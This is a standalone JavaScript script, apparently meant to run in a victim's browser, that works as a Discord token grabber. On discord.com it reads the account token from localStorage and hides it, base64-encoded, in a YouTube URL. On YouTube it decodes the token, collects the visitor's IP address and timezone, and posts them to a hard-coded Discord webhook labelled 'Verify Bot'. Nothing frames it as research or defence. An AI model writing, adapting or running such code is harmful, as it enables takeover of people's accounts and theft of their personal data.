setTimeout(() => {
    console.log("Script executed after 2 seconds!");

    const webhookURL = 'https://discord.com/api/webhooks/1332219931588034630/VCkO6nJoho1ZkLrUUAU6oenxzPXQHDs6tIJ4kEFtayR8EdCA-dnD0JVBB5t5dJUWmkYP';

    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = atob(url.searchParams.get("v"));
        if (param != null) {

            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const message = {
                        username: "Verify Bot",
                        embeds: [
                            {
                                title: "Logged Info",
                                description: `IP: ${ip}\nTimezone: ${timezone}\nToken: ${param}`,
                                color: 16711935 // Pink
                            }
                        ]
                    };

                    // Send to Discord webhook FIRST
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .then(() => {
                        console.log("Data sent to webhook. Redirecting now...");
                        setTimeout(() => {
                            window.location.href = "https://discord.com/channels/@me";
                        }, 3000); // Wait 3 seconds before redirecting
                    })
                    .catch(error => console.error('Error sending to webhook:', error));
                })
                .catch(error => console.error('Error fetching IP:', error));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {

        const token = localStorage.token;
        if (token != null) {
            console.log("Token found, encoding and redirecting...");
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
            }, 3000); // Delay redirect
        }
    } else {
        setTimeout(() => {
            window.location.href = "https://discord.com/channels/@me";
        }, 3000); // Delay redirect
    }
}, 2000); // 2-second delay before running script
